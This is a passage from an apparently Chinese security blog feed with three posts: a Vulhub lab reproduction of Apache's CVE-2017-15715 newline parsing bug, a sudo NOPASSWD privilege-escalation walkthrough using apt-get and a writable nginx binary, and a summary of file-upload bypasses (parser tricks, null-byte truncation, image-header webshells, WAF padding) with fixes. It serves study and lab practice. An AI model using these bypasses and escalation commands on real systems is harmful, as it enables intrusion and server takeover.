      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续复现CVE，之前复现了两个CVE,分别是CVE-2015-5254，CVE-2016-3088。现在轮到<br>CVE-2017-15715<br><img src="http://d.ifengimg.com/w600/e0.ifengimg.com/09/2018/1202/BE29F14379EA67C985989BA1CB839741BB0CB6D0_size172_w1920_h1080.jpeg" alt="BE29F14379EA67C985989BA1CB839741BB0CB6D0_size172_w1920_h1080.jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞简介</b><br>Apache HTTPD 换行解析漏洞（CVE-2017-15715）<br>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p><b>靶场搭建</b><br>这里下载docker环境：<a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a><br>然后进入httpd，进入CVE-2017-15715<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/vulhub/httpd/CVE-2017-15715</span><br><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure></p><p><b>踩到的坑</b><br>进入靶机后自己写个表单。靶机里面只给了index.php…真是mmp，我折腾了半天<br>发现不能像普通那样传参,也就是$_FILE[‘file’][‘name’]这样，否则输入的%0a会被自动过滤掉。哇草，坑了我半天，解决这个坑的文章<a href="https://www.cnblogs.com/leixiao-/p/10223090.html" target="_blank" rel="noopener">Apache HTTPD 换行解析漏洞（CVE-2017-15715）&amp;&amp; Apache HTTPD 未知后缀解析漏洞 - 淚笑 - 博客园</a></p><p><b>实验</b><br>环境搭建好后，访问<a href="http://127.0.0.1:8080,会出现以下图片一样" target="_blank" rel="noopener">http://127.0.0.1:8080,会出现以下图片一样</a><br><img src="https://s2.ax1x.com/2019/01/23/kEFk1s.png" alt="kEFk1s.png"></p><p>然后去到自己写的表单那里，上传文件输入文件名burp抓包<br><img src="https://s2.ax1x.com/2019/01/23/kEF6DP.png" alt="kEF6DP.png"></p><p>直接上传php是不成功的<br><img src="https://s2.ax1x.com/2019/01/23/kEFLUU.png" alt="kEFLUU.png"></p><p>在php后面插入一个0a就能触发换行解析漏洞<br>未添加之前：<br><img src="https://s2.ax1x.com/2019/01/23/kEkfZ6.png" alt="kEkfZ6.png"></p><p>添加之后：<br><img src="https://s2.ax1x.com/2019/01/23/kEkvo8.png" alt="kEkvo8.png"></p><p>最终结果：<br><img src="https://s2.ax1x.com/2019/01/23/kEASJg.png" alt="kEASJg.png"></p><p>靶机里面上传的文件：<br><img src="https://s2.ax1x.com/2019/01/23/kEAGTK.md.png" alt="kEAGTK.md.png"></p><p>最终访问：<br>访问也要加上%0a<br><a href="http://192.168.89.157:8080/demo3s.php%0a?r=phpinfo()" target="_blank" rel="noopener">http://192.168.89.157:8080/demo3s.php%0a?r=phpinfo()</a>;<br><img src="https://s2.ax1x.com/2019/01/23/kEEeBt.png" alt="kEEeBt.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux abuse of rights</title>
      <link href="/posts/f448c508.html"/>
      <url>/posts/f448c508.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过LInux在/etc/sudoers滥配置的提权研究，原文：<a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="noopener">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity</a><br><img src="http://img1.vhaor.com/mmbiz_jpg/b69RXPicqD0jxAxEowBrtc5ppKQmvTBfpNstJ0AfSPulBQ4E9Ku1sQOYYrNalqOiayFQxVfh6FfBbJfReWxicdHfQ/640?wx_fmt=jpeg" alt="640?wx_fmt=jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>为了做好实验我们先做好对应的准备，原文有针对以下几个滥用的提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NOPASSWD的两个apt-get dpkg</span><br><span class="line">NOPASSWD与/usr/local/openresty/nginx/nginx权限为777 openresty</span><br></pre></td></tr></table></figure></p><p>系统环境为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04</span><br></pre></td></tr></table></figure></p><p>Ubuntu默认没有安装openresty,安装方法：<a href="https://blog.csdn.net/zstu_cc/article/details/50334585" target="_blank" rel="noopener">Ubuntu 平台下OpenResty的安装 - zstu_cc的专栏 - CSDN博客</a><br>配置出一个存在提权漏洞的环境：<br>sudo vim /etc/sudoers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cs ALL=(ALL)NOPASSWD:/usr/bin/apt-get,/usr/bin/nginx,/usr/bin/dpkg</span><br><span class="line">这里的cs为你要测试的用户名NOPASSWD后面的是执行sudo后不用输入密码的命令</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/22/kkwtW4.png" alt="kkwtW4.png"></p><p>配置完之后，切换一个没root权限的用户输入sudo -l即可看到刚刚配置的操作<br><img src="https://s2.ax1x.com/2019/01/22/kkwDw6.png" alt="kkwDw6.png"></p><h4 id="NOPASSWD-apt提权"><a href="#NOPASSWD-apt提权" class="headerlink" title="NOPASSWD:apt提权"></a>NOPASSWD:apt提权</h4><p>查看apt-get帮助手册可以看见，-o []option]的参数用户可以自行设置<br>图片借用原文：<br><img src="https://lsdsecurity.com/storage/2019/01/aptgetman.png" alt="aptgetman.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行：apt update APT::Update::Pre-InVoke::=&quot;/bin/bash -i&quot;</span><br></pre></td></tr></table></figure></p><p>发现权限已经变更<br><img src="https://s2.ax1x.com/2019/01/22/kkBTzQ.png" alt="kkBTzQ.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pre-Invoke是预调用的意思</span><br></pre></td></tr></table></figure></p><h4 id="usr-local-openresty-nginx-nginx提权"><a href="#usr-local-openresty-nginx-nginx提权" class="headerlink" title="/usr/local/openresty/nginx/nginx提权"></a>/usr/local/openresty/nginx/nginx提权</h4><p>这里我没有成功，由于/us/local/openresty/nginx/sbin/nginx权限为777，导致可以随意写入<br>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash -i&quot; &gt; /usr/local/openresty/nginx/sbin/nginx</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/22/kkg7tI.png" alt="kkg7tI.png"><br>然后原文是执行openrety即可提权成功<br><img src="https://s2.ax1x.com/2019/01/22/kk2eHJ.png" alt="kk2eHJ.png"></p><p><img src="https://s2.ax1x.com/2019/01/22/kk2a4I.md.png" alt="kk2a4I.md.png"><br>知道怎么回事的师父可以告诉我一下吗= =#！</p><p>后面的完全不知道怎么操作<br><a href="https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/" target="_blank" rel="noopener">Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration – Logan S Diomedi – lsdsecurity</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Summary of File Upload Vulnerabilities</title>
      <link href="/posts/d9bed590.html"/>
      <url>/posts/d9bed590.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对文件上传漏洞的一些总结，由于某游戏影响导致今天没什么状态。现已删除该游戏<br><img src="http://p0.ifengimg.com/pmop/2017/02/01/24e0d955-ab0f-4c1d-adb1-7e4f8b970aa9.jpg" alt="24e0d955-ab0f-4c1d-adb1-7e4f8b970aa9.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件上传本不是漏洞，但是由于后端程序处理逻辑有问题导致发生文件上传漏洞。</span><br><span class="line">上传文件是web脚本语言，服务器的web容器解释并执行了用户上传的脚本，导致代码执行。</span><br><span class="line">上传文件是Flash的策略文件crossdomain.xml，可以控制Flash在域下的该行为。</span><br><span class="line">上传文件是病毒，木马文件，用以诱骗优化或者管理员下载执行。</span><br><span class="line"></span><br><span class="line">除此之外，还有一些不常见的利用方法。比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传一个合法的文本文件</span><br><span class="line">当是内容里面包含了PHP脚本，在通过本地文件包含漏洞或者解析漏洞使其解析。执行里面的内容</span><br></pre></td></tr></table></figure></p><p>完成攻击具备的要求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户上传的文件能被容器解释执行，所以文件上传后所在的目录要是web容器所覆盖到的路径</span><br><span class="line">其次，用户能够从web访问这个文件，如果文件上传，但用户无法通过web访问，或者无法得到web容器解释这个脚本，那么也不能称之为漏洞</span><br><span class="line">最后，用户上传的文件若被安全检查，格式化，图片压缩等功能改变了内容，则也可能导致攻击不成功</span><br></pre></td></tr></table></figure></p><p>一些常见的解析漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">从FCKEditor文件上传漏洞：</span><br><span class="line">FCKEditor是一款非常流行的富文本编辑器，为了方便用户，它带有一个文件上传功能，但是这个功能却出过多次漏洞</span><br><span class="line">FCKEditor针对ASP/PHP/JSP等环境都有对应的版本，以PHP为例，其文件上传功能在：</span><br><span class="line">/FCKEditor/editor/filemanager/browser/default/browser.html</span><br><span class="line"></span><br><span class="line">目录解析（6.0）</span><br><span class="line">形式：www.xxx.com/xx.asp/xx.jpg</span><br><span class="line">原理：服务器默认会把.asp,.asp目录下的文件都解析成asp文件</span><br><span class="line"></span><br><span class="line">文件解析</span><br><span class="line">形式：www.xx.com/xx.asp;.jpg</span><br><span class="line">原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了</span><br><span class="line"></span><br><span class="line">解析文件类型：</span><br><span class="line">IIS6.0默认的可执行文件除了asp还包含这三种：asa,cer,cdx</span><br><span class="line">/test.asa</span><br><span class="line">/test.cer</span><br><span class="line">/test.cdx</span><br><span class="line"></span><br><span class="line">apache解析漏洞</span><br><span class="line">原理：Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如：</span><br><span class="line">test.php.qwe.asd .qwe和.asd这两种后缀是apache不可识别解析，apache就会把kd.php.asa.wrwq 解析为：kd.php</span><br><span class="line"></span><br><span class="line">漏洞形式：www.xx.com/xx.php.php123</span><br><span class="line">其余问题导致漏洞：</span><br><span class="line">如果在Apache的conf里面有这样一行配置AddHandler php5-script.php 这时只要文件名包含.php及时文件名是test2.php.jpg也会按照php</span><br><span class="line">来执行</span><br><span class="line"></span><br><span class="line">如果在Apache的conf里面有这样一行配置AddType application/x-httpd-php.jpg</span><br><span class="line">及时后缀名是.jpg一样能以php方式执行</span><br><span class="line"></span><br><span class="line">修复方案</span><br><span class="line">apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</span><br><span class="line">用伪静态能解决这个问题，重写类似于.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line">把#号去掉，重启apache，在网站目录下建立.htaccess文件</span><br><span class="line"></span><br><span class="line">nginx解析漏洞</span><br><span class="line">原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则设置SCRIPT_FILENAME。当访问</span><br><span class="line">www.xxx.com/phpinfo.jpg/1..php这个url的时，$fastcgi_script_name会被设置为phpinfo.jpg/1.php,然后构造成SCRIPT_FILENAME传递给PHP</span><br><span class="line">CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为php文件解析呢？这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么</span><br><span class="line">就会触发PHP如下的逻辑：</span><br><span class="line">php会认为SCRIPT_FILENAME是phpinfo.jpg,而1.php是PATH_INFO，所以就会将phpinfo.jpg作为php文件来解析了</span><br><span class="line"></span><br><span class="line">漏洞形式</span><br><span class="line">www.xxx.com/UploadFiles/image/1.jpg/x.php</span><br><span class="line">www.xxx.com/UploadFiles/image/1.jpg%00.php</span><br><span class="line">www.xxx.com/UploadFiles/image/1.jpg/%20\0.php</span><br><span class="line"></span><br><span class="line">test.jpg里面的内容为：&lt;?php xxxx;?&gt;</span><br><span class="line">另外一种手法：上传一个名字为test.jpg然后访问test.jpg/.php在这个目录下就会生成一句话木马shell.php</span><br><span class="line"></span><br><span class="line">IIS7.5解析漏洞</span><br><span class="line">IIS7.5的漏洞与nginx类似，都是由于php配置文件中，开启了cgi.fix_pathinfo,而这并不是nginx或者iis7.5本身的漏洞</span><br><span class="line">上传不符合windows文件名规则的文件名：</span><br><span class="line">test.asa</span><br><span class="line">test.asp(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br><span class="line">会被windows系统自动去掉不符合规则符号后面的内容</span><br></pre></td></tr></table></figure></p><p>绕过文件上传功能检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">一般都是通过文件名后缀检查。但是在某些时候攻击者手动修改了上传过程的POST包，在文件名后添加了一个%00字节额，则可以截断某些函数对</span><br><span class="line">文件名的判断。因为在许多语言的函数中，比如在C，PHP等语言的常用字符串处理函数中，0x00被认为是终止符。受此影响的环境有web应用和一</span><br><span class="line">些服务器。比如应用原本只允许上传jpg图片，那么可以构造文件名为xxx.php[\0].jpg,其中[\0]为十六进制的0x00字符，.jpg绕过了应用的上传文件</span><br><span class="line">类判断，但对于服务器来说，此文件因为0x00字符截断的关闭，最终变成了xxx.php。</span><br><span class="line"></span><br><span class="line">客户端效验</span><br><span class="line">一般都是在网页上写一段javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。</span><br><span class="line">判断方式：</span><br><span class="line">在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时还没发送数据包。</span><br><span class="line"></span><br><span class="line">客户端绕过</span><br><span class="line">利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可</span><br><span class="line"></span><br><span class="line">服务端效验</span><br><span class="line">content-type字段效验</span><br><span class="line">绕过方式：抓包将content-type字段改为image/gif</span><br><span class="line"></span><br><span class="line">文件头效验</span><br><span class="line">可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</span><br><span class="line">（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”</span><br><span class="line">（2）  .gif，”GIF 89A”</span><br><span class="line">（3）  .zip，”Zip Compressed”</span><br><span class="line">（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">文件头绕过</span><br><span class="line">在木马内容基础上再加了一些文件信息，有点像下面的结构</span><br><span class="line">或者使用copy命令将需要对应文件头的例如图片和一句话木马合为一个在上传</span><br><span class="line">copy xx.jpg/b+dd.php/a xd.php </span><br><span class="line">GIF9a&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">MIME验证</span><br><span class="line">MIME验证</span><br><span class="line"></span><br><span class="line">MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 </span><br><span class="line"></span><br><span class="line">它是一个互联网标准，扩展了电子邮件标准，使其能够支持： </span><br><span class="line"></span><br><span class="line">非ASCII字符文本；非文本格式附件（二进制、声音、图像等）；由多部分（multiple parts）组成的消息体；包含非ASCII字符的头信息（Header information）。 </span><br><span class="line"></span><br><span class="line">这个标准被定义在RFC 2045、RFC 2046、RFC 2047、RFC 2048、RFC 2049等RFC中。 MIME改善了由RFC 822转变而来的RFC 2822，这些旧标准规定电子邮件标准并不允许在邮件消息中使用7位ASCII字符集以外的字符。正因如此，一些非英语字符消息和二进制文件，图像，声音等非文字消息原本都不能在电子邮件中传输(MIME可以)。MIME规定了用于表示各种各样的数据类型的符号化方法。 此外，在万维网中使用的HTTP协议中也使用了MIME的框架，标准被扩展为互联网媒体类型。</span><br><span class="line"></span><br><span class="line">MIME的作用</span><br><span class="line">使客户端软件区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。 Web服务器使用MIME来说明发送数据的种类，Web客户端使用MIME来说明希望接收到的数据种类。</span><br><span class="line">一个普通的文本邮件的信息包含一个头部分（To: From: Subject: 等等）和一个体部分（Hello Mr.,等等）。在一个符合MIME的信息中，也包含一个信息头并不奇怪，邮件的各个部分叫做MIME段，每段前也缀以一个特别的头。MIME邮件只是基于RFC 822邮件的一个扩展，然而它有着自己的RFC规范集。</span><br><span class="line">头字段：MIME头根据在邮件包中的位置，大体上分为MIME信息头和MIME段头。（MIME信息头指整个邮件的头，而MIME段头只每个MIME段的头。）</span><br><span class="line"></span><br><span class="line">MIME验证</span><br><span class="line">MIME验证</span><br><span class="line"></span><br><span class="line">MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 </span><br><span class="line"></span><br><span class="line">它是一个互联网标准，扩展了电子邮件标准，使其能够支持： </span><br><span class="line"></span><br><span class="line">非ASCII字符文本；非文本格式附件（二进制、声音、图像等）；由多部分（multiple parts）组成的消息体；包含非ASCII字符的头信息（Header information）。 </span><br><span class="line"></span><br><span class="line">这个标准被定义在RFC 2045、RFC 2046、RFC 2047、RFC 2048、RFC 2049等RFC中。 MIME改善了由RFC 822转变而来的RFC 2822，这些旧标准规定电子邮件标准并不允许在邮件消息中使用7位ASCII字符集以外的字符。正因如此，一些非英语字符消息和二进制文件，图像，声音等非文字消息原本都不能在电子邮件中传输(MIME可以)。MIME规定了用于表示各种各样的数据类型的符号化方法。 此外，在万维网中使用的HTTP协议中也使用了MIME的框架，标准被扩展为互联网媒体类型。</span><br><span class="line"></span><br><span class="line">MIME的作用</span><br><span class="line">使客户端软件区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。 Web服务器使用MIME来说明发送数据的种类，Web客户端使用MIME来说明希望接收到的数据种类。</span><br><span class="line">一个普通的文本邮件的信息包含一个头部分（To: From: Subject: 等等）和一个体部分（Hello Mr.,等等）。在一个符合MIME的信息中，也包含一个信息头并不奇怪，邮件的各个部分叫做MIME段，每段前也缀以一个特别的头。MIME邮件只是基于RFC 822邮件的一个扩展，然而它有着自己的RFC规范集。</span><br><span class="line">头字段：MIME头根据在邮件包中的位置，大体上分为MIME信息头和MIME段头。（MIME信息头指整个邮件的头，而MIME段头只每个MIME段的头。）</span><br><span class="line"></span><br><span class="line">mime类型</span><br><span class="line">https://www.bugbank.cn/images/article/20170804/ee885613e9382e1bc8f6b88e1ffa96ab.jpg</span><br><span class="line"></span><br><span class="line">mimetype判断</span><br><span class="line">一般先判断内容的前十个字节，来判断文件类型，然后再判断后缀名</span><br><span class="line"></span><br><span class="line">文件名扩展绕过</span><br><span class="line">前提：黑名单效验</span><br><span class="line">黑名单检测：一般有个专门的blacklist文件，里面会包含常见的危险脚本文件</span><br><span class="line"></span><br><span class="line">绕过方法：</span><br><span class="line">找黑名单扩展名的漏网之鱼 - 比如asa和cer之类的</span><br><span class="line">可能存在大小写绕过漏洞 - 比如aSp和pHp之类</span><br><span class="line"></span><br><span class="line">能被解析的文件名扩展名列表</span><br><span class="line">jsp jspx jspf</span><br><span class="line">asp asa cer aspx</span><br><span class="line"></span><br><span class="line">配合文件包含漏洞</span><br><span class="line">前提：存在文件包含漏洞</span><br><span class="line">绕过方式：</span><br><span class="line">（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</span><br><span class="line">（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;</span><br><span class="line">此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</span><br><span class="line">（2）linux下后缀名大小写</span><br><span class="line">在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</span><br><span class="line">如上传一句话图片木马，马子未被执行，可以使用包含漏洞，调出一句话图片木马，代码被执行。</span><br></pre></td></tr></table></figure></p><p>WAF绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">垃圾数据</span><br><span class="line">有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验</span><br><span class="line">https://www.bugbank.cn/images/article/20170804/219cdfec2d4ebd194e20c4a1d4077bec.jpg</span><br><span class="line"></span><br><span class="line">POST/GET</span><br><span class="line"></span><br><span class="line">有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</span><br><span class="line"></span><br><span class="line">此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</span><br><span class="line"></span><br><span class="line">修改数据包里面的一些参数，如这篇文章：https://422926799.github.io/2018/08/06/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8A%E4%BC%A0/</span><br></pre></td></tr></table></figure></p><p>修复方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、文件上传的目录设置为不可执行</span><br><span class="line"></span><br><span class="line">2、判断文件类型：强烈推荐白名单方式。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</span><br><span class="line"></span><br><span class="line">3、使用随机数改写文件名和文件路径：一个是上传后无法访问；再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</span><br><span class="line"></span><br><span class="line">4、单独设置文件服务器的域名：由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</span><br></pre></td></tr></table></figure></p><p>生成针对黑名单检测的后缀名字典进行爆破：<a href="https://www.freebuf.com/articles/web/188464.html" target="_blank" rel="noopener">构造优质上传漏洞Fuzz字典 - FreeBuf互联网安全新媒体平台</a></p><p>那里存在文件上传漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">服务器配置不当</span><br><span class="line">开源编辑器的上传漏洞</span><br><span class="line">本地文件上传限制被绕过</span><br><span class="line">过滤不严或被绕过</span><br><span class="line">文件解析漏洞导致文件执行</span><br><span class="line">文件路径截断</span><br></pre></td></tr></table></figure></p><p>靶场测试;<br>DVWA文件上传高级+本地文件包含<br>首先看一波文件上传高级的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &apos;Upload&apos; ] ) ) &#123; /*判断是否存在Upload这个POST请求变量*/</span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; /*上传成功后的路径*/</span><br><span class="line">    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );/* 函数返回路径中的文件名部分*/</span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); /*strrpos获取指定字符串最后出现的地方的位置，获取后缀名*/</span><br><span class="line">    $uploaded_size = 